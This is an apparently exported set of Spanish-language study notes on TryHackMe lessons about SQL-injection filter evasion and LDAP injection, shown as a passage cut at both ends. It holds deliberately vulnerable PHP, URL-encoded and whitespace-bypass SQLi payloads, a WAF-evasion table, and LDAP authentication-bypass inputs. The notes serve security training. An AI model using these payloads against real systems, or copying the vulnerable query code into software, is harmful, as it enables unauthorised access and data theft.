$book_name);\n$sql = \"SELECT * FROM books WHERE book_name = '$book_name'\";\necho \"<p>Generated SQL Query: $sql</p>\";\n$result = $conn->query($sql) or die(\"Error: \" . $conn->error . \" (Error Code: \" . $conn->errno . \")\");\nif ($result->num_rows > 0) {\n    while ($row = $result->fetch_assoc()) {\n...\n..\n```\n\nEste es el c√≥digo Javascript en el `index.html` que ofrece la interfaz para la b√∫squeda de libros.\n\n```javascript\nfunction searchBooks() {\nconst bookName = document.getElementById('book_name').value;\nconst xhr = new XMLHttpRequest();\nxhr.open('GET', 'search_books.php?book_name=' + encodeURIComponent(bookName), true);\n   xhr.onload = function() {\n       if (this.status === 200) {\n           document.getElementById('results').innerHTML = this.responseText;\n```\n\nEn el ejemplo de arriba, el desarrollador ha implementado un mecanismo de defensa b√°sico para prevenir los ataques de inyecci√≥n SQL eliminando palabras clave espec√≠ficas como `OR`, `AND`, `UNION` y `SELECT`. El filtro usa la funci√≥n `str_replace`, la cual extrae estas palabras claves del input del usuario antes de incluirlas en la query SQL. Este acercamiento de filtro busca hacer m√°s dif√≠cil a los atacantes inyectar comandos SQL maliciosos, ya que estas palabras claves son esenciales para dichos ataques.\n\n-------------------------------------------\n<h2>Preparing the Payload</h2>\nCaminemos por el proceso de preparar un payload de inyecci√≥n SQL paso a paso, mostrando c√≥mo el encodeado URL puede sobrepasar defensas b√°sicas. Primero, veamos qu√© ocurre con un input normal que contiene caracteres especiales o palabras clave SQL. \n\n![[Pasted image 20260103131048.png]]\n\nPero ¬øqu√© pasa si tratamos de a√±adir `'` o `;`? Obtendremos el siguiente output.\n\n![[Pasted image 20260103131126.png]]\n\nLa query SQL no se est√° ejecutando correctamente lo que probablemente significa que hay una probabilidad de SQLi. Intentemos inyectar el payload `Intro to PHP' OR 1=1`.\n\n![[Pasted image 20260103131225.png]]\n\nLo que est√° pasando aqu√≠ es que el script PHP est√° usando la funci√≥n `str_replace` que extrae la palabra clave `OR` y la comilla simple, resultando en un input sanitizado que no ejecutar√° la inyecci√≥n SQL intentada. Este input es inefectivo porque el filtro elimina los componentes cr√≠ticos necesarios.\n\nPara sobrepasar el filtro necesitamos encodear el input usando encodeade URL, el cual representa caracteres especiales y palabras clave en una forma en la que el filtro no reconoce ni elimina estas. Aqu√≠ est√° el payload de ejemplo `1%27%20||%201=1%20--+`.\n\n- `%27`: URL encoding para `'`.\n- `%20`: URL encoding para el espacio ` `.\n- `||`: Representa el operador `OR` SQL.\n- `%3D`: URL encoding para el signo `=`.\n- `%2D%2D`: URL encoding para `--`, que comienza el comentario en SQL.\n\nEn el payload de arriba `1'` cierra el valor o string actual de la query SQL. Por ejemplo, si la query busca un nombre de libro que coincida con `1`, a√±adiendo `'` cerramos la string, haciendo al resto del inputparte del statement SQL. La parte `|| 1=1` usa el operador `OR` SQL para a√±adir una condici√≥n que siempre es `true`. Esta condici√≥n asegura que la query devuelve true para todos los registros sobrepasando la condici√≥n original que supuestamente iba a restringir resultados. De forma similar, `--` comienza un comentario SQL causando que la base de datos ignore el resto de la query. Esto es √∫til para terminar cualquier parte de la query que pueda causar errores de sintaxis o condiciones no deseadas. Para asegurar un buen spacing, `+` a√±ade un espacio despu√©s del comentario, asegurando que el comentario est√° terminado y que no habr√° errores de sintaxis.\n\nDesde la consola podemos ver que hacer click en el bot√≥n hace una llamada AJAX a `search_book.php`.\n\n![[Pasted image 20260105121106.png]]\n\nUsaremos el payload directamente en la p√°gina PHP para evitar validaciones innecesarias del cliente. Visitaremos la URL `http://IP/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1` con el payload est√°ndar `Intro to PHP' OR 1=1`, y veremos un error.\n\n![[Pasted image 20260105121242.png]]\n\nAhora URLencodeamos el payload `Intro to PHP' || 1=1 --+` usando CyberChef por ejemplo e intentamos acceder a la URL. Obtendremos la siguiente informaci√≥n.\n\n![[Pasted image 20260105122258.png]]\n\nEl payload funciona porque el URL encode representa los caracteres especiales y las palabras clave SQL de una forma que sobrepasa el mecanismo de filtrado. Cuando el servidor decodifica el input URLencodeado, devuelve los caracteres especiales y palabras clave, permitiendo la inyecci√≥n SQL. Usando URL encoding los atacantes pueden configurar payloads que sobrepasan los filtros b√°sicos sobre el input. Esto demuestra la importancia de usar t√©cnicas de defensa m√°s robustas.",
    "modified": "2026-01-06T00:54:54"
  },
  {
    "title": "5. Filter Evasion Techniques - continued",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/5-filter-evasion-techniques-continued/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/5. Filter Evasion Techniques - continued.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "<h2>No-Quote SQL Injection</h2>\nLas t√©cnicas de inyecci√≥n SQL sin comilla se usan cuando la aplicaci√≥n filtra las comillas dobles y simples.\n\n- **Usar Valores Num√©ricos:** Un acercamiento es usar valores num√©ricos u otros tipos de datos que no requieran comillas. Por ejemplo, en vez de inyectar `' OR '1'='1`, un atacante podr√≠a usar `OR 1=1`. Esta t√©cnica  puede bypassear filtros espec√≠ficos de comillas.\n- **Usar Comentarios SQL:** Otro m√©todo involucra usar comentarios SQL para terminar el resto de la query. Por ejemplo, el input `admin'--` puede transformarse en `admin--`, donde `--` significa el inicio del comentario SQL. Esto puede ayudar a sobrepasar filtros y evitar errores de sintaxis.\n- **Usar la Funci√≥n CONCAT():** Los atacantes pueden usar funciones SQL como `CONCAT()` para construir strings sin comillas. Por ejemplo `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)` construye la string `admin`. La funci√≥n `CNCAT()` y m√©todos similares permiten a los atacantes construir strings sin usar comillas directamente.\n\n---------------------------------------\n<h2>No Spaces Allowed</h2>\nCuando los espacios no est√°n permitidos o est√°n filtradoos, se pueden usar varias t√©cnicas para bypassear esta restricci√≥n.\n\n- **Comentar para Reemplazar Espacios:** Un m√©todo com√∫n es usar comentarios SQL `/**/` para reemplazar a los espaccios. Por ejemplo, en lugar de poner `SELECT * FROM users WHERE name = 'admin'`, un atacante podr√≠a poner `SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'`. Los comentarios pueden reemplazar a los espacios en la query.\n- **Tabular o Hacer Nueva L√≠nea:** Otro acercamiento es usar el tabulador `\\t` o la nueva l√≠nea `\\n` como sustitutos del espacio. Algunos filtros pueden permitir estos caracteres permitiendo al atacante construir una query como `SELECT\\t*\\tFROM\\tusers\\tWHERE\\tname\\t=\\t'admin'`.\n- **Caracteres Alternos:** Otro m√©todo efectivo es usar caracteres URL encodeados representando diferentes tipos de espacio blanco como `%09` (tabulaci√≥n horizontal), `%0A` (line feed), `%0C` (form feed), `%0D` (carriege return) o `%A0` (non-breaking space). Estos caracteres pueden reemplazar los espacios.\n\n----------------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\nEn este escenario tenemos un endpoint, `http://10.82.133.85/space/search_users.php?username=?` que devuelve los detalles del usuario basados en el nombre de usuario proporcionado. El desarrollador ha implementado filtros para bloquear palabras clave de las inyecciones SQL comunes como `OR`, `AND` y espacios (`%20`).\n\nAqu√≠ est√° el filtro PHP a√±adido por el desarrollador:\n\n```php\n$special_chars = array(\" \", \"AND\", \"and\" ,\"or\", \"OR\" , \"UNION\", \"SELECT\");\n$username = str_replace($special_chars, '', $username);\n$sql = \"SELECT * FROM user WHERE username = '$username'\";\n```\n\nSi usamos nuestro payload est√°ndar `1%27%20||%201=1%20--+`, podemos ver que el URL encoding no est√° funcionando.\n\n![[Pasted image 20260105131521.png]]\n\nLa query SQL muestra que los espacios son omitidos por el c√≥digo. Para sobrepasar estas protecciones podemos usar los caracteres URLencodeados que representan diferentes tipos de espacios o cortes de l√≠nea como `%09`, `%0A`.\n\nEl payload original `1' OR 1=1 --` puede ser modificado para usar caracteres de nueva l√≠nea en vez de espacios, resultando en el payload `1'%0A||%0A1=1%0A--%27+`. Este payload construye la misma condici√≥n l√≥gica que `1' OR 1=1 --` pero usa caracteres de nueva l√≠nea para sobrepasar el filtro de espacios.\n\nEl parser SQL interpreta los caracteres de l√≠nea nueva como espacios, transformando el payload en `1' OR 1=1 --`. Por esto, la query ser√° interpretada de `SELECT * FROM users WHERE username = '$username'` a `SELECT * FROM users WHERE username = '1' OR 1=1 --`.\n\nAhora si accedemos al endpoint a trav√©s de un payload actualizado, podemos ver todos los detalles.\n\n![[Pasted image 20260105133144.png]]\n\nPara resumir, es importante entender que no hay una t√©cnica simple que garantice un bypass al lidiar con filtros o Firewalls de Aplicaciones Web (WAFs) dise√±ados para prevenir los ataque de inyecciones SQL. Sin embargo, aqu√≠ hay algunos consejos y trucos que puedes usar para circunvalar estas protecciones. Esta tabla muestra varias t√©cnicas que pueden ser empleadas para sobrepasar filrtos y WAFs.\n\n\n| **Escenario**                                                               | Descripci√≥n                                                                                                                | Ejemplo                                                                                                 |\n| --------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |\n| **Palabras clave como SELECT est√°n prohibidas**                             | Las palabras clave SQL pueden ser sobrepasadas cambiando las may√∫sculas/min√∫scular o a√±adiendo comentarios inline.         | SElEcT * FrOm users or SE/**/LECT * FROM/**/users                                                       |\n| **Los espacios est√°n prohibidos**                                           | Usar caracteres de espacio alternativos o comentarios para reemplazar espacios puede sobrepasar filtros.                   | SELECT%0A*%0AFROM%0Ausers or SELECT/**/*/**/FROM/**/users                                               |\n| **Operadores l√≥gicos como OR o AND est√°n prohibidos**                       | Usar operadores l√≥gicos alternativos o concatenaci√≥n puede sobrepasar estos filtros.                                       | username = 'admin' && password = 'password' or username = 'admin'/**/\\|/**/1=1 --                       |\n| **Palabras clave comunes como UNION o SELECT est√°n prohibidas**             | Usar representaciones equivalentes como hexadecimal o encodeado Unicode para sobrepasar filtros.                           | SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)                                     |\n| **Palabras clave espec√≠ficas como OR, AND, SELECT, UNION est√°n prohibidas** | Usar t√©cnicas de ofuscaci√≥n para disfrazar palabras clave SQL combinando caracteres con funciones de string o comentarios. | SElECT * FROM users WHERE username = CONCAT('a','d','m','i','n') or SElEcT/**/username/**/FROM/**/users |\n\nEn entornos reales, las queries que aplicas y la visibilidad de las palabras clave filtradas no son directamente posibles. Como pentester, es importante entender que la inyecci√≥n SQL habitualmente incluye un acercamiento de prueba y error requiriendo perseverancia. Cada entorno puede tener filtros y protecciones √∫nicas haciendo necesario adaptarse e intentar diferentes t√©cnicas para encontrar un vector de inyecci√≥n exitoso.",
    "modified": "2026-01-06T00:54:54"
  },
  {
    "title": "3. Search Queries",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/5-ldap-injection/3-search-queries/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/5. LDAP Injection/3. Search Queries.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 5. LDAP Injection",
    "content": "Las queries de b√∫squeda de LDAP son fundamentales para interactuar con directorios LDAP permiti√©ndote localizar y recuperar informaci√≥n almacenada en el directoorio. Entender c√≥mo construir estas queries es crucial para utilizar efectivamente los servicios LDAP.\n\nUna query de b√∫squeda LDAP consiste en varios componentes, cada uno usado para una cosa en la operaci√≥n de b√∫squed:\n\n1. **Base DN (Distinguished Name):** Este es el punto de comienzo de la b√∫squeda en el √°rbol de directorios.\n2. **Scope:** Define c√≥mo de profundo debe buscar desde el base DN. Puede ser uno de los siguientes:\n\t- `base`: Busca s√≥lo el base DN.\n\t- `one`: Busca el hijo inmediao del base DN.\n\t- `sub`: Busca en el base DN y todos sus descendientes.\n3. **Filter:** Un criterio que debe coincidir con el resultado para que sea devuelto. Usa una sintaxis espec√≠fica.\n4. **Attributes:** Especifica qu√© caracter√≠sticas de las entradas coincidentes deber√≠an ser devueltas en los resultados.\n\nLa sintaxis b√°sica de una query de b√∫squeda LDAP es como:\n\n```default\n(base DN) (scope) (filter) (attributes)\n```\n\n-----------------------------------------------\n<h2>Filtros y Sintaxis</h2>\nLos filtros son el n√∫cleo de las queries de b√∫squeda LDAP, definiendo las condiciones que lass entradas en el directorio deben cuemplir para ser inclu√≠das en los resultados de b√∫squeda. La sintaxis de los filtros LDAP se define en [RFC 4515](https://www.openldap.org/lists/ietf-ldapbis/200606/msg00010.html), donde los filtros se presentan como strings con un formato espec√≠fico como `(canonicalName=value)`. Estos filtros pueden usar una variedad de operadores para refinar los criterios de b√∫squeda, incluyendo igualdad (`=`), presencia (`=*`), mayor y menor que (`>=`/`<=`).\n\nUno de los operadores m√°s esenciales de LDAP es `*` el cual significa que coincida cualquier caracter. Este operador es crucial para formular coincidencias amplias o parciales.\n\n---------------------------------------------\n<h2>Ejemplos de Filtros</h2>\n<h4>Filtro Sencillo:</h4>\n```default\n(cn=John Doe)\n```\n\nEste filtro devuelve entradas con un canonical name (`cn`) exactamente igual a \"John Doe\".\n\n<h4>Wildcards:</h4>\n```php\n(cn=J*)\n```\n\nEste filtro aplica el operador wildcard para que los resultados coincidan con cualquier `cn` que comience con \"J\".\n\n<h4>Filtros Complejos con Operadores L√≥gicos:</h4>\nPara queries de b√∫squeda m√°s complejas, podemos usar filtros con operadores l√≥gicos como AND (`&`), OR (`|`) o NOT (`!`).\n\n```default\n(&(objectClass=user)(|(cn=John*)(cn=Jane*)))\n```\n\nEste filtro busca entradas clasificadas como \"user\" en su clase de objeto y tenga un canocical name que comience o con \"John\" o con \"Jane\".\n\nAunque no suelen estar expuestos, los servicios LDAP pueden ser accesibles a trav√©s de la red v√≠a los puertos 389 (para conexiones StartTLS no encriptadas) y el 535 (para conexxiones SSL/TLS). Cuando los servicios LDAP son accesibles p√∫blicamente, herramientas como `ldapsearch` pueden ser usadas para interactuar con el servidor LDAP. Esta herramienta permite a un usuario realizar queries y modificar el directorio LDAP desde la l√≠nea de comandos.\n\n```bash\nuser@tryhackme$ ldapsearch -x -H ldap://MACHINE_IP:389 -b \"dc=ldap,dc=thm\" \"(ou=People)\"\n# extended LDIF\n#\n# LDAPv3\n# base <dc=ldap,dc=thm> with scope subtree\n# filter: (ou=People)\n# requesting: ALL\n#\n\n# People, ldap.thm\ndn: ou=People,dc=ldap,dc=thm\nobjectClass: organizationalUnit\nobjectClass: top\nou: People\n\n# search result\nsearch: 2\nresult: 0 Success\n\n# numResponses: 2\n# numEntries: 1\n```\n\nEste comando usa `ldapsearch` para realizar una b√∫squeda contra un servidor LDAP localizado en el puerto 389, comenzando en el base DN `dc=ldap,dc=thm` y usando un filtro que buscar√±a entradas bajo la OU \"People\".",
    "modified": "2026-01-15T00:53:38"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/5-ldap-injection/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/5. LDAP Injection/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 5. LDAP Injection",
    "content": "LDAP, que significa Lightweight Directory Access Protocol (Protocolo de Acceso a Directorios Ligero), es un protocolo ampliamente usado para acceder y mantener servicios de informaci√≥n en directorios distribuidos mediante IP (Internet Protocol). Permite a las organizacione manejar a usuarios centralmente, as√≠ como grupos y otra informaci√±on de directorios, normalmente usado para prop√≥sitos de autentificaci√≥n y autorizaci√≥n en aplicaciiones web e internas.\n\n------------------------------------------\n<h2>Objetivos</h2>\n1. Ofrecer un entendimiento concienzudo de LDAP y su rol en los servicios de directorios.\n2. Explorar el √°rbol de estructura de LDAP y sus componentes clave.\n3. Introducci√≥n a LDAP injection, su impacto y c√≥mo puede ser explotada.\n4. Equiparse con los conocimientos y habilidades necesarias para identificar y mitigar las vulnerabilidades de inyecci√≥n LDAP.\n\n---------------------------------------\n<h2>Pre-requisitos</h2>\n1. Entendimiento b√°sico de c√≥mo funcionan los servicios de directorios.\n2. Conocimiento b√°sico de principios de seguridad de aplicaciones web y vulnerabilidades comunes.\n3. Familiaridad de la estructura y los componentes de LDAP, como Distinguished Names (DNs) y atributos.\n4. Experiencia con herramientas y t√©cnicas de testeo de seguridad en aplicaciones web como OWASP ZAP o Burp Suite.",
    "modified": "2026-01-14T00:57:10"
  },
  {
    "title": "0. LDAP Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/5-ldap-injection/0-ldap-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/5. LDAP Injection/0. LDAP Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 5. LDAP Injection",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/5. LDAP Injection/1. Introduction]]\n[[2. Structure]]\n[[3. Search Queries]]\n[[4. Injection Fundamentals]]\n[[5. Exploiting LDAP]]\n[[6. Blind LDAP Injection]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/5. LDAP Injection/7. Automating the Exploitation]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Structure",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/5-ldap-injection/2-structure/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/5. LDAP Injection/2. Structure.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 5. LDAP Injection",
    "content": "En LDAP, las entradas de directorios est√°n estructurados como objetos, cada uno adhiri√©ndose a un esquema espec√≠fico que define las reglas y atributos aplicables al objeto. Este acercamiento orientado a objetos asegura consistencia y dirige c√≥mo objetos como los usuarios o grupos se representan y manipulan en el directorio.\n\n<h4>Servicios que usan LDAP</h4>\n- **Microsoft Active Directory:** Un servicio para redes de dominio de Windows utiliza LDAP como pate de su protocolo base mpara manejar recursos de dominios.\n- **OpenLDAP:** Una implementaci√≥n de c√≥digo abierto de LDAP ampliamenet usada para manejar la informaci√≥n de los usuarios.\n\n--------------------------------------\n<h2>Formato LDIF</h2>\nLas entradas LDAP pueden representarse usando el LDAP Data Interchange Format (LDIF), un formato est√°ndar de texto plano para representar entradas de directorios LDAP y operaciones de actualizaci√≥n. LDIF importa y exporta contenidos de directorio y describe modificaciones de directorios como a√±adir, modificar o eliminar entradas.\n\n--------------------------------------\n<h2>Estructura</h2>\nUn directorio LDAP sigue una estructura jer√°rquica como el √°rbol del sistema de archivos. Esta estructura comprende varias entradas representando un √∫nico √≠tem, como usuario, grupo o recurso.\n\n![[Pasted image 20260113152745.png]]\n\nArriba del √°rbol LDAP encontramos el **TLD (top-level domain)**, como `dc=ldap,dc=thm`. Debajo del TLD puede haber **subdominios** u **organizational units (OUs)** como `ou=people` p `ou=groups`, las cuales categorizan las entradas de directorios.\n\n- **Distinguished Names (DNs):** Sirve como identificador √∫nicao para cada entrada en el directorio especificando el camino desde arriba hasta la entrada, por ejemplo: `cn=John Doe,ou=people,dc=example,dc=com`.\n- **Relative Distinguished Names (RDNs):** Representa niveles individuales en la jerarqu√≠a de directorios, como `cn=John Doe`, donde `cn` significa **Common Name**.\n- **Atributos:** Definen las propiedades de las entradas de directorios, como `mail=john@example.com`.",
    "modified": "2026-01-14T00:57:10"
  },
  {
    "title": "5. Exploiting LDAP",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/5-ldap-injection/5-exploiting-ldap/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/5. LDAP Injection/5. Exploiting LDAP.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 5. LDAP Injection",
    "content": "La inyecci√≥n LDAP puede ser particularmente peligrosa al ser explotada en sus mecanismos de autentificaci√≥n. Los atacantes pueden manipular las queries LDAP para bypassear controles de seguridad ganando acceso a aplicaciones. \n\nPor ejemplo, debajo est√° un trozo de c√≥digo PHP simplificado usado en una aplicaci√≥n web para la autentificaci√≥n de usuarios en el servidor LDAP.\n\n```php\n<?php\n$username = $_POST['username'];\n$password = $_POST['password'];\n\n$ldap_server = \"ldap://localhost\";\n$ldap_dn = \"ou=People,dc=ldap,dc=thm\";\n$admin_dn = \"cn=tester,dc=ldap,dc=thm\";\n$admin_password = \"tester\"; \n\n$ldap_conn = ldap_connect($ldap_server);\nif (!$ldap_conn) {\n    die(\"Could not connect to LDAP server\");\n}\n\nldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);\n\nif (!ldap_bind($ldap_conn, $admin_dn, $admin_password)) {\n    die(\"Could not bind to LDAP server with admin credentials\");\n}\n\n// LDAP search filter\n$filter = \"(&(uid=$username)(userPassword=$password))\";\n\n// Perform the LDAP search\n$search_result = ldap_search($ldap_conn, $ldap_dn, $filter);\n\n// Check if the search was successful\nif ($search_result) {\n    // Retrieve the entries from the search result\n    $entries = ldap_get_entries($ldap_conn, $search_result);\n    if ($entries['count'] > 0) {\n        foreach ($entries as $entry) {\n            if (is_array($entry)) {\n                if (isset($entry['cn'][0])) {\n                    $message = \"Welcome, \" . $entry['cn'][0] . \"!\\n\";\n                }\n            }\n        }\n    } else {\n        $error = true;\n    }\n} else {\n    $error = \"LDAP search failed\\n\";\n}\n?>\n```\n\nEste c√≥digo es vulnerable porque inserta directamente el input proporcionado por el usuario (`$username` y `$password`) en la query LDAP sin sanitizar ni escapar.\n\nPara explotar esta vulnerabilidad, un atacante puede subir un nombre de usuario con un filtro LDAP malicioso. Por ejemplo, el atacante podr√≠a usar un nomber de usuario como `*`, lo que traducido a la query LDAP siempre se eval√∫a como `true`.\n\nEsta query autentificar√° exitosamente si hay alg√∫n usuario en el directorio LDAP, ya que la condici√≥n inyectada `uid=*` siempre ser√° `true`.\n\n---------------------------------------------\n<h2>T√©cnicas de Bypass de Autentificaci√≥n</h2>\n<h4>Tautology-Based Injection</h4>\nLa inyecci√≥n basada en tautolog√≠a (repetici√≥n innecesaria y poco afortunada) involucra insertar condiciones en una query LDAP que son inherentemente ciertas, asegurando as√≠ que la query devuelve `true`. Este m√©todo es particularmente efectivo contra queries construu√≠das con el input del usuario sin sanitizar correctamente. Considera una query de autentificaci√≥n LDAP donde el username y password se insertan desde el input del usuario.\n\n```php\n(&(uid={userInput})(userPassword={passwordInput}))\n```\n\nUn atacante podr√≠a ofrecer un input tautology-based, como `*)(|(&` para `userInput}` y `pwd)` para `{passwordInput}`, lo que transforma la query en:\n\n```php\n(&(uid=*)(|(&)(userPassword=pwd)))\n```\n\nEsta query bypassea la comprobaci√≥n de la contrase√±a debido a c√≥mo los operadores l√≥gicos se usan en el filtro. La query consiste en dos partes, uso combinado y el operador AND (`&`).\n\n1. `(uid=*)`: Esta parte del filtro coincide con cualquier entrada con un atributo `uid`, es decir, todos los usuarios.\n2. `(|(&)(userPassword=pwd))`: El operador OR (`|`) significa que cualquiera de las dos condiciones dentro necesita ser `true` para sobrepasar el filtro. En LDAP, una condici√≥n AND (`&`)vac√≠a se considera siempre true. La otra condici√≥n comprueba si el atributo `userPassword` coincide con el valor `pwd`, que fallar√° si el usuario no usa `pwd` como contrase√±a.\n\nPoni√©ndolo todo junto, la segunda parte del filtro `(|(&)(userPassword=pwd))` siempre ser√° true debido a la condici√≥n `(&)`. El operador OR s√≥lo necesita que una de sus condiciones sea true, por lo que el OR entero es true sin importar la contrase√±a.\n\n<h4>Wildcard Injection</h4>\nlos wildcards (`*`) se utilizan en las queries LDAP para coincidir con cualquier secuencia de caracteres, haci√©ndolos herramientas poderosas para b√∫squedas amplias. Sin embargo, cuando el input del usuario que contiene wildcards no se sanitiza correctamente, puede llevar a resultados de query no intencionados, como bypassear la autentificaci√≥n. Por ejemplo, si la query de b√∫squeda se ve as√≠:\n\n```php\n(&(uid={userInput})(userPassword={passwordInput}))\n```\n\nUn atacante piede usar un wildcard como input en ambos `uid` y `password`. Usar `*` en el nomber de usuario puede hacer que la query ignore nombres espec√≠ficos y se centre en la password. Sin embargo al haber un wildcard (`*`) presente en la contrase√±a, no valida el contenido de esta contra un valor esperado. En su lugar s√≥lo comprueban la existenca del atributo `userPassword` sin importar su contenido.\n\nEsto significa que la query devolver√° un resultado positivo para cualquier usuario sin verificar que la contrase√±a dada durante el proceso de autentificaci√≥n coincide con la contrase√±a guardada.\n\n------------------------------------------------------------\n<h2>Ejemplo de Bypasseo de Autentificaci√≥n</h2>\nPara demostrar un ataque simple de inyecci√≥n LDAP, ve a `http://IP/normal.php`. Basado en el c√≥digo de arriba, la aplicaci√≥n construye una query LDAP para la autentificaci√≥n basada en el input del usuario sin la sanitizaci√≥n adecuada.\n\nUn atacante puede explotar esto subiendo un username y una password con un caracter que la aplicaci√≥n no espera, como un asterisco para los atributos uid y userPassword. Esto hace que la condici√≥n siempre se evalue en true, bypasseando la comprobaci√≥n de contrase√±a.\n\n<h4>Username y Password Inyectados</h4>\n```php\nusername=*&password=*\n```\n\n![[Pasted image 20260115111936.png]]\n\n<h4>Componente Resultante de Query LDAP</h4>\n```php\n(&(uid=*)(userPassword=*))\n```\n\n![[Pasted image 20260115112003.png]]\n\nEsta inyecci√≥n siempre hace que la condici√≥n de la query LDAP sea true. Sin embargo, usar s√≥lo el caracter `*` resultar√° siempre en el primer resultado. Para apuntar a informaci√≥n espec√≠fica, el atacante puede usar un payload como `f*`, lo que buscar√° un `uid` que comience por `f`.\n\n![[Pasted image 20260115112140.png]]",
    "modified": "2026-01-16T00:55:48"
  },
  {
    "title": "4. Injection Fundamentals",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/5-ldap-injection/4-injection-fundamentals/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/5. LDAP Injection/4. Injection Fundamentals.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 5. LDAP Injection",
    "content": "La inyecci√≥n LDAP es una vulnerabilidad de seguridad cr√≠tica que ocurre cuando el input de un usuario no se sanitiza correctamente antes de incorporarlo en queries LDAP. \n\nLa inyecci√≥n LDAP explota la forma en la que las aplicaciones web construyen queries LDAP. Cuando el input del usuario se a√±ade directamente en estas queries sin una correcta sanitizaci√≥n y validaci√≥n, los atacantes pueden inyectar  statements LDAP maliciosos.\n\nEl proceso es parecido al de la SQLi, donde se inyectan statements SQL maliciosos para manipular las operaciones de las bases de datos.\n\n------------------------------------------------\n<h2>Vectores de Ataques Comunes</h2>\n1. **Bypass de Autentificaci√≥n:** Modificar las queries de autentificaci√≥n LDAP para iniciar sesi√≥n con otro usuario sin saber su contrase√±a.\n2. **Acceso no Autorizado a Datos:** Alterar queries de b√∫squeda LDAP para recuperar informaci√≥on sensible que no deber√≠a poder ser accedida.\n3. **Manipulaci√≥n de Datos:** Inyectar queries que modifican el directorio LDAP, como a√±adir o modificar atributos de usuario.\n\n----------------------------------------------\n<h2>Proceso de Injecci√≥n</h2>\nHacer un ataque de inyecci√≥n LDAP requiere varios pasos clave, desde identificar el punto de inyecci√≥n hasta explotar la vulnerabilidad.\n\n![[Pasted image 20260115095813.png]]\n\nEste diagrama ilustra la interacci√≥n entre el atacante, la aplicaci√≥n web y el servidor LDAP durante uno de estos ataques.",
    "modified": "2026-01-16T00:55:48"
  },
  {
    "title": "6. Blind LDAP Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/5-ldap-injection/6-blind-ldap-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/5. LDAP Injection/6. Blind LDAP Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 5. LDAP Injection",
    "content": "La inyecci√≥n LDAP a ciegas es una variante m√°s sutil de la inyecci√≥n LDAP donde el atacante no recibe un output directo del payload inyectado. En su lugar debe inferir la informaci√≥n basado en el comportamiento de la aplicaci√≥n.\n\nLa blind LDAP injection requiere diferentes acercamientos debido a la falta de resultados espec√≠ficos de queries. Los atacantes deben confiar en las se√±ales indirectas, como cambios en el comportamiento de la aplicaci√≥n, mensajes de error o tiempos de respuesta para deducir la estructura de la query LDAP y la existencia de vulnerabilidades.\n\nPor ejemplo, debajo hay un trozo de c√≥digo de `http://IP/blind.php` que usa una query LDAP para comprobar la existencia de un usuario pero s√≥lo devuelve un error gen√©rico al fallar. La aplicaci√≥n tambi√©n comprueba si el email subido es el mismo que el email de la base de datos.\n\n```php\n$username = $_POST['username'];\n$password = $_POST['password'];\n\n$ldap_server = \"ldap://localhost\"; \n$ldap_dn = \"ou=users,dc=ldap,dc=thm\";\n$admin_dn = \"cn=tester,dc=ldap,dc=thm\"; \n$admin_password = \"tester\"; \n\n$ldap_conn = ldap_connect($ldap_server);\nif (!$ldap_conn) {\n    die(\"Could not connect to LDAP server\");\n}\n\nldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);\n\nif (!ldap_bind($ldap_conn, $admin_dn, $admin_password)) {\n    die(\"Could not bind to LDAP server with admin 